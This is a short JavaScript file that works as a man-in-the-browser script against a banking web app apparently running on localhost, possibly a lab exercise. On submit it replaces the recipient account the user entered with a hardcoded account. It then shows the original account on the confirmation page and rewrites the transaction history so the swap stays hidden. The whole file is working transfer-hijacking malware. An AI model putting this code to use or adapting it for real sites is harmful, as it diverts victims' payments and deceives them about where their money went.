window.addEventListener('load', () => {
    if (window.location.href == 'http://localhost:8000/transaction_new/') {
        document.addEventListener("submit", function() {
            true_account = document.getElementById("account_number").value;
            localStorage.setItem("good_account", true_account);
            document.getElementById("account_number").value = '7638177985';
        });
    } else if (window.location.href == 'http://localhost:8000/transaction_confirmation/' || window.location.href == 'http://localhost:8000/') {
        document.getElementById("transfer_to").innerHTML = localStorage.getItem("good_account");
    } else if (window.location.href == 'http://localhost:8000/transaction_history/') {
        const transfers = document.querySelectorAll(".transfer");
        var randomAccount = '3242760298';
        for (var i = transfers.length - 1; i >= 0; i--) {
            console.log('transfer: ', transfers[i]);
            if (transfers[i].innerHTML === 'Do: 7638177985') {
                transfers[i].innerHTML = randomAccount
            } else {
                randomAccount = transfers[i].innerHTML;
            }
        }
    }
})